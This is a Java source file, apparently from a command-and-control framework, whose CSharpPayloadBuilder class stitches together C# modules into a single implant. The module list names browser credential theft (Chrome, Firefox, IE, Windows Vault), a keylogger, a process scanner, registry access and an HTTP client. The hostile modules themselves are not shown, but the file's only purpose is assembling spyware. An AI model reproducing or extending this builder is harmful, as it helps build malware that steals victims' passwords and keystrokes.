package c2.file;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class CSharpPayloadBuilder {
	public static String buildPayload(String path) throws IOException {
		String args[] = {"common\\encryptor.cs", "common\\permissions.cs", "common\\registry.cs", "common\\event_helper.cs", "common\\chrome_helper.cs", "common\\cred_helper.cs",
				"common\\firefox.cs", "common\\ie_helper.cs", "common\\network_helper.cs", "common\\process_scanner.cs",
				"common\\sysinfo.cs", "common\\vault_helper.cs", "common\\cs_keylogger.cs", "common\\client.cs", "http_client.cs"};
		
		StringBuilder sb = new StringBuilder();
		
		BufferedReader br = new BufferedReader(new FileReader(path + "\\common\\master_import.cs"));
		String line;
		while((line = br.readLine()) != null) {
			sb.append(line);
			sb.append(System.lineSeparator());
		}
		br.close();
		
		for(String arg : args) {
			String fullPath = path + "\\" + arg;
			br = new BufferedReader(new FileReader(fullPath));
			while((line = br.readLine()) != null) {
				if(line.startsWith("using ")) {
					continue;
				}
				sb.append(line);
				sb.append(System.lineSeparator());
			}
			br.close();
		}
		
		return sb.toString();
	}
}
